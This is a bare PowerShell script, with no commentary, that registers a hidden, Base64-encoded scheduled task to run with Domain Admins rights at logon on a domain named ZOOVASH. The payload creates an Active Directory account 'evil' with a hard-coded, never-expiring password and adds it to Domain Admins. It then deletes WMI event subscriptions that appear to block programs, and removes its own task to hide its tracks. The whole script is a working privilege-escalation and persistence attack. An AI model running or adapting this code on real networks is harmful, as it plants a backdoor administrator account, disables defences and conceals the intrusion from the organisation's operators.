$command = {
		
    
    Invoke-Command -ComputerName DC -ScriptBlock {
			
        $arguments = @{
				
            Name = 'evil'
            SamAccountName = 'evil'
            AccountPassword = $(ConvertTo-SecureString -String "#v1lH4ck3r" -AsPlainText -Force)
            CannotChangePassword = $false 
            ChangePasswordAtLogon = $false
            Enabled = $true
            PasswordNeverExpires = $true
            Type = 'User'
        }
			
        New-ADUser @arguments -PassThru | Add-ADPrincipalGroupMembership -MemberOf "Domain Admins"		
    }

    & {

        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='FilterProgram'" | Remove-WmiObject
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='BlockExe'" | Remove-WmiObject
        # Get-WmiObject -Namespace root\subscription -Class LogFileEventConsumer -Filter "Name='LogEvents'" | Remove-WmiObject
        $filterName = '\\.\root\subscription:__EventFilter.Name="FilterProgram"'
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where { $_.Filter -eq $filterName } | Remove-WmiObject

        <#
		Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='FilterProgram'" 
		Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='BlockExe'" 
		Get-WmiObject -Namespace root\subscription -Class LogFileEventConsumer -Filter "Name='LogEvents'"
		$filterName = '\\.\root\subscription:__EventFilter.Name="FilterProgram"'
		Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where { $_.Filter -eq $filterName }
		#>

    }

    Unregister-ScheduledTask -TaskName new -Confirm:$false

}.ToString()
		
[byte[]]$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [System.Convert]::ToBase64String($bytes)

$trigger = New-ScheduledTaskTrigger -AtLogOn
$arguments = @{
    Execute = 'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe'
    Argument = "-NoProfile -NonInteractive -WindowStyle Hidden -encodedCommand $encodedCommand"
}

$action = New-ScheduledTaskAction @arguments

$principal = New-ScheduledTaskPrincipal -GroupId "ZOOVASH\Domain Admins" -RunLevel Highest

$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal

Register-ScheduledTask -TaskName new -InputObject $task